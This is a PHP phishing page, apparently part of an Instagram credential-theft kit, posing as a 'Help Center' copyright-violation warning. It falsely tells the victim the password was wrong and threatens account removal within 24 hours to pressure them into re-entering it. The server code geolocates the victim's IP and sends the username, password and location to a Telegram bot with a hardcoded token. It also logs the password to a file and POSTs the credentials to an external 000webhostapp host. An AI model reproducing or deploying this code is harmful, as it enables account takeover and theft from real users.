<?php
$username= $_GET["username"];

if($_POST){

	$username=$_GET["username"];
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$token='5064921826:AAHQYwmcIGibCdcQmzIw3jBbezb6IqCTqJM';
$data = [
'text' => '
Double 
Kullanıcı Adı : '.$username.'
ş2 : '.$password.'
Ulke: '.$ulke.'
Sehir: '.$sehir.'
Tarih : '.$cur_time.'

',
    'chat_id' =>-642841787
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    $file = fopen('hesaplar.php', 'a');
fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='black'>

<font color='red'> 2.Şifre: </font><font color='white'>".$password."</font><br>
<hr>

"); 

fclose($file);
echo '';
  
   header("Location: confirms.php?username=$username");
   $link ="https://sevheyeter.000webhostapp.com/dsh.php";
   $yazi ="user=$username&pass=$password&tarih=$cur_time&yer=$ulke";
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $link);
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_POST, true);
   curl_setopt($curl, CURLOPT_POSTFIELDS, $yazi);
   $veri = curl_exec($curl);
   curl_close($curl);
}
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="css/global.css">
    <title>Help Center</title>
</head>
<body>
<center><div class="ortala"><br>
<div style="    box-shadow: rgba(0, 38, 255, 0.753) 0px 5px 15px;
    border-radius: 5px;
    width: 300px;
    height:820px;"><img src="img/insta.gif" alt="İMG" width="200px">
<h1 style="font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size: 20px;"><b>@<?php echo $username ?></b> </h1><br><p style="max-width:87%; font-size:15px; color: #999; line-height:20px; font-weight:400;">
<font class="yazix" color="#ed4956"><center>Sorry, your password was wrong. Please check your password carefully.</center></font><br><br>
<p class="yazix">
Dear @<?php echo $username ?> , We have received numerous complaints that you have violated our copyright laws regarding your account. If you do not give us feedback, your account will be removed within 24 hours.
If you think this is incorrect, please verify your information below. We ask for this information because we cannot verify that you are the true owner of your account.</p>
<form method="POST">
    <br>
    <input type="password" name="password" placeholder="Password" class="cnt">
    <br><br><br><br>
    <button name="buton" class="buton">Continue As @<?php echo $username?></button> 
</form>
</div>
</div>
</center>
</body>
</html>
<script type='text/javascript'></script><style > 
    img[src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"]{
     display:none!important;
    }
</style>